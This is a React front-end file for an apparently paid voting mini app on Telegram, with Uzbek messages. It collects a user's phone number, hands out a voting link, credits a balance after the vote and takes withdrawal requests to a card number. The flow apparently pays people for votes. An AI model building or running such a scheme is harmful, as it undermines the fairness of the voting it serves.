import React, { useEffect, useCallback } from 'react';
import AdminPanel from './components/AdminPanel';

// Components
import LoadingScreen from './components/common/LoadingScreen';
import MainPage from './components/pages/MainPage';
import PhonePage from './components/pages/PhonePage';
import ResultsPage from './components/pages/ResultsPage';

// Hooks
import { useTelegram } from './hooks/useTelegram';
import { useApi } from './hooks/useApi';
import { useNavigation } from './hooks/useNavigation';
import { useStatus } from './hooks/useStatus';
import { usePhoneNumber } from './hooks/usePhoneNumber';

// Utils
import { getThemeColors } from './utils/theme';

// Constants
import { ROUTES, VOTE_STATUS } from './constants';

/**
 * Main Application Component
 * Manages the overall state and routing for the Telegram voting application
 */
const App = () => {
    // Check if URL contains telegram/web for balance access
    const currentUrl = window.location.href;
    const isTelegramWeb = currentUrl.includes('telegram/web');
    
    // Custom hooks for business logic
    const { tg, user, theme, isLoading: telegramLoading, showAlert, showBackButton, hideBackButton } = useTelegram();
    const navigation = useNavigation({ showBackButton, hideBackButton });
    const { status, showSuccess, showError, showLoading, hideStatus } = useStatus();
    const phoneNumber = usePhoneNumber();
    const api = useApi(user);
    

    // Fetch balance when user becomes available (but not on admin page) and only for telegram/web URLs
    useEffect(() => {
        if (user && !navigation.isCurrentPage(ROUTES.ADMIN) && isTelegramWeb) {
            api.fetchBalance();
        }
    }, [user, isTelegramWeb]);

    // Event handlers
    const handleOpenPhonePage = useCallback(() => {
        console.log('💆 [App] handleOpenPhonePage called');
        navigation.navigateToPhone();
        phoneNumber.clearPhoneInput();
        hideStatus();
    }, [navigation, phoneNumber, hideStatus]);

    const handleOpenResultsPage = useCallback(async () => {
        console.log('💆 [App] handleOpenResultsPage called');
        navigation.navigateToResults();
        await api.fetchResults();
    }, [navigation, api]);

    const handleBackToMain = useCallback(() => {
        navigation.navigateToMain();
        phoneNumber.clearPhoneInput();
        hideStatus();
    }, [navigation, phoneNumber, hideStatus]);

    const handleComingSoon = useCallback(() => {
        console.log('💆 [App] handleComingSoon called');
        showAlert('Tez orada!');
    }, [showAlert]);

    const handlePhoneInputChange = useCallback((e) => {
        phoneNumber.handlePhoneInput(e);
        hideStatus();
    }, [phoneNumber, hideStatus]);

    const handlePhoneSubmit = useCallback(async () => {
        console.log('📱 Starting phone submission...');
        console.log('📱 Phone input:', phoneNumber.phoneInput);
        
        const validation = phoneNumber.validateCurrentPhoneNumber();
        console.log('📱 Validation result:', validation);
        
        if (!validation.isValid) {
            console.log('📱 Validation failed:', validation.error);
            showError(validation.error);
            return;
        }

        const fullPhone = phoneNumber.getFullPhoneNumber();
        const cleanPhone = phoneNumber.getCleanPhoneNumber();
        
        console.log('📱 Phone numbers:', { fullPhone, cleanPhone });

        showLoading('⏳ Yuborilmoqda...');

        try {
            console.log('📱 Calling API...');
            const result = await api.submitPhoneVerification(fullPhone, cleanPhone);
            console.log('📱 API result:', result);
            
            // Store the phone number for vote status updates
            phoneNumber.setAsCurrentPhoneNumber(fullPhone);
            
            if (result.data?.message) {
                console.log('📱 Success with message:', result.data.message);
                showSuccess('✅ Muvaffaqiyatli! Ovoz berish uchun linkni bosing', result.data.message);
            } else {
                console.log('📱 Success without message');
                showSuccess('✅ Muvaffaqiyatli!');
            }
        } catch (error) {
            console.error('💥 Phone submission error:', error);
            showError(`❌ Xatolik: ${error.message}`);
        }
    }, [phoneNumber, showError, showLoading, api, showSuccess]);

    const handleVotingLinkClick = useCallback(() => {
        // Update vote status to CLICKED before opening the link
        if (phoneNumber.currentPhoneNumber) {
            api.updateVoteStatus(phoneNumber.currentPhoneNumber, VOTE_STATUS.CLICKED);
            // Show confirmation message after clicking
            setTimeout(() => {
                showSuccess('✅Ovoz bergan bo\'lsangiz 40 minutdan keyin balansingizni tekshiring');
            }, 100);
        }
    }, [phoneNumber.currentPhoneNumber, api, showSuccess]);

    const handleWithdrawalRequest = useCallback(async (withdrawalData) => {
        console.log('💸 [App] handleWithdrawalRequest called with:', withdrawalData);
        return await api.requestTransaction(withdrawalData.cardNumber, withdrawalData.phoneNumber, withdrawalData.amount);
    }, [api]);

    // Computed values
    const colors = getThemeColors(theme);

    // Show loading screen while Telegram is initializing
    if (telegramLoading || !user) {
        return <LoadingScreen message="Loading Telegram..." />;
    }

    return (
        <div style={{
            width: '100%',
            minHeight: '100vh',
            backgroundColor: colors.background,
            fontFamily: '-apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", sans-serif'
        }}>
            {/* MAIN PAGE */}
            {navigation.isCurrentPage(ROUTES.MAIN) && (
                <MainPage
                    user={user}
                    balance={isTelegramWeb ? api.balance : null}
                    balanceLoading={isTelegramWeb ? api.balanceLoading : false}
                    onRefreshBalance={isTelegramWeb ? () => api.fetchBalance(true) : () => {}}
                    onNavigateToPhone={handleOpenPhonePage}
                    onNavigateToResults={handleOpenResultsPage}
                    onComingSoon={handleComingSoon}
                    onWithdrawalRequest={isTelegramWeb ? handleWithdrawalRequest : null}
                    colors={colors}
                    theme={theme}
                    showAlert={showAlert}
                />
            )}

            {/* PHONE PAGE */}
            {navigation.isCurrentPage(ROUTES.PHONE) && (
                <PhonePage
                    phoneInput={phoneNumber.phoneInput}
                    onPhoneInputChange={handlePhoneInputChange}
                    onSubmit={handlePhoneSubmit}
                    onBack={handleBackToMain}
                    status={status}
                    onStatusUrlClick={handleVotingLinkClick}
                    colors={colors}
                    theme={theme}
                />
            )}

            {/* RESULTS PAGE */}
            {navigation.isCurrentPage(ROUTES.RESULTS) && (
                <ResultsPage
                    results={api.results}
                    resultsLoading={api.resultsLoading}
                    onRefresh={api.fetchResults}
                    onBack={handleBackToMain}
                    colors={colors}
                    theme={theme}
                />
            )}

            {/* ADMIN PANEL */}
            {navigation.isCurrentPage(ROUTES.ADMIN) && (
                <AdminPanel 
                    colors={colors} 
                    theme={theme} 
                />
            )}
        </div>
    );
};

export default App;